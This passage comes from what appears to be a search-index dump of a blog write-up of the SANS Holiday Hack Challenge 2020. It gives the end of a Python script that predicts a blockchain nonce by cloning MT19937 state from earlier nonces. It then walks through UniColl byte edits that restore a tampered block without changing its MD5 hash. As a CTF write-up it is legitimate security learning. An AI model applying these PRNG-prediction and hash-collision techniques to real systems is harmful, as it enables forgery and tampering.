nonce\\_list.append(c2.blocks\\[i\\].nonce) # reeversing the list nonce\\_list.reverse() # get the first 625 nonces last\\_625\\_block\\_nonce = list(itertools.islice(nonce\\_list,625)) # reverse the list so we get the last 625 nonces last\\_625\\_block\\_nonce.reverse() # Setting the data for 625 nonces to the MT19937Predictor for nonce in last\\_625\\_block\\_nonce: predictor.setrandbits(nonce, 64) # calcutated nonce and added for block 12997 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(13205885317093879758,64) # calculated nonce and added for block 12998 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(109892600914328301,64) # calculated nonce and added for block 12999 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(9533956617156166628,64) # Get the nonce for block 13000 print(predictor.getrandbits(64))","title":"The whole naughty_nice.py"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#determine-and-extract-the-original-naughty-document","text":"Below is part of the 129459.pdf - Jack\u2019s document (obviously a nice one!) Nice document for Jack Frost Open the file 129549.pdf in an online hex editor [ https://hexed.it/ ] and make changes (See right side) Ref: https://speakerdeck.com/ange/colltris?slide=194 PDF which Jack Frost had (left, the nice list) and the recovered PDF (right, the naughty list) Save the changes as a different PDF file. Open and you see the different PDF \u2013 the naughty list, the original one meant for Jack Frost. The naughty list for Jack Frost","title":"Determine and extract the original naughty document:"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#determine-the-flag-for-naughtynice-in-the-jacks-block","text":"Open the Jack\u2019s block file in online hex editor and compare the text version of the block to find the nice/naughty flag. Jake must have changed this from 0 (original which means naughty) to 1 (nice). The position of the naughty nice flag in the hex for the PDF","title":"Determine the flag for naughty/nice in the Jack\u2019s block :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#determine-3rd-and-4th-byte-which-were-changed-by-jake","text":"At this point, we have two bytes identified \u2013 one for the PDF page number and another for nice/naughty flag. The 3rd and 4th bytes identified Following the Unicoll computation technique as noted in https://speakerdeck.com/ange/colltris?slide=109 The 1st byte \u2013 This is the nice/naughty flag we decreased by 1 (31 to 30) The 2ndByte \u2013 This would be the 10th byte of the next block which we need to increase by 1 (D6 to D7) The 3rd Byte \u2013 This is the PDF page number which we increased by 1 (32 to 33) The 4th Byte \u2013 This would be the 10th byte of the next block which we need to decrease by 1 (1C to 1B) Please see the screenshot below for the all changes: left side is Jake's block (block.dat) right side is original block which Jake changed (block_restored.dat) - changes in bytes noted below. Jack's block (left) and original block restored which Jack changed (right) - remember , the MD5 for both is still same! Jake was able to change the original block without changing the hash. His block\u2019s MD5 has was b10b4a6bd373b61f32f4fd3a0cdfbf84 We needed to undo his changes and restore the original block, without changing the MD5 hash. As you can see with the below changes, the hashes still don\u2019t change. MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of original block (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of original block which Jack modified (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 Now we just need to save the changes in a new file block_restored.dat and calculate the SHA256 hash of it. SHA256 of the block_restored.dat fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb SHA256 of the restored block - fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb The below zip file contains the changed naughty_nice.py (please remove .txt after extraction) 11b_naughty_nice_changed.py Download","title":"Determine 3rd and 4th byte which were changed by Jake :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#all-objectives-are-completed-now","text":"","title":"All objectives are completed now"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#all-narratives-have-been-unlocked","text":"","title":"All narratives have been unlocked"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-best-part","text":"After completing all the objectives, you go to Santa's office. Tinsel Upatree says \"Quickly go out to the balcony to be recognized\"!! You go the roof and and congratulations are in order!!!! Jack's plan is foiled!","title":"The best part!"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-exclusive-winner-hoodie","text":"I got myself the exclusive Holiday Hack challenge 2020 winner hoodie!","title":"The exclusive winner hoodie :"}]}